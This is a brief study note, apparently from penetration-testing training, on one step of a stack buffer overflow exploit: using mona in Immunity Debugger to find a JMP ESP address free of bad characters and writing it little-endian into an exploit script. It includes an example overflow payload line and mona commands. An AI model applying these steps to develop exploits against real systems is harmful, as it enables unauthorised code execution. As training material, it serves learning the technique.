# Finding the right module

!mona modules to check for protection such as ASLR 

Convert jmp esp to hex code \(use online tools or nasm\_shell\) 

Ffe4 

In immunity debugger : 

`!mona find -s "\xff\xe4" -m <<VULNERABLE_DLL>>` 

Start from top and edit the scriot for each one 

`Shellcode = "A" * 2003 + "\xaf\x11\x50\x62"` \(hex code is in reverse order\) 

Find the code in immunity after closing mona and add breakpoint using f2 



### Alternative

run the following mona command, making sure to update the -cpb option with all the badchars you identified \(including \x00\): 

`!mona jmp -r esp -cpb "\x00"` 

This command finds all "jmp esp" \(or equivalent\) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window \(use the Window menu to switch to it if needed\). 

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards \(since the system is little endian\). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit. 

